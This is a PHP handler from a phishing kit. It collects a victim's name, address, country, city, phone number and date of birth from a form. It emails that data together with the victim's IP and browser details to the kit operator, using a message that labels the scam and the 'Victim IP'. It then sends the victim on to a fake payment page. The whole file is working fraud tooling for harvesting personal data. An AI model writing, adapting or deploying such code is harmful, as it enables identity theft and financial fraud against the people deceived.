<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['sname'] = htmlspecialchars($_POST['name']);
$_SESSION['saddress'] = htmlspecialchars($_POST['address']);
$_SESSION['scountry'] = htmlspecialchars($_POST['country']);
$_SESSION['scity'] = htmlspecialchars($_POST['city']);
$_SESSION['sphone'] = htmlspecialchars($_POST['phone']);
$_SESSION['sdate'] = htmlspecialchars($_POST['date']);


if(empty($_SESSION['sname']) || empty($_SESSION['saddress']) || empty($_SESSION['scountry']) || empty($_SESSION['scity']) || empty($_SESSION['sphone']) || empty($_SESSION['sdate'])) {
    header("Location: ../infoz.php?page=error&userid={$id}&ue={$ue}");
}
else {

    $subject = "CARD ".SCAM_NAME." ".FLAG." FROM: $ip";
    $rezdata = "🥷🏻 INFOZ ".SCAM_NAME." ".FLAG."

🥷🏻 Name : ".$_SESSION['sname']."
🥷🏻 Adresse : ".$_SESSION['saddress']."
🥷🏻 Country : ".$_SESSION['scountry']."
🥷🏻 City : ".$_SESSION['scity']."
🥷🏻 Phone : ".$_SESSION['sphone']."
🥷🏻 Dob : ".$_SESSION['sdate']."

🌐 Victim IP : $ip
💠 OS : $agent
    
⚡️ 乃 ㄥ 卂 匚 Ҝ  千 ㄖ 尺 匚 乇 ™ ⚡️
    ";
    
    $maildata = $rezdata;
    
    sendCard($rezdata);
    sendMail($maildata);

    header("Location: ../payment.php?userid={$id}&ue={$ue}");
}

}
// SMS Config END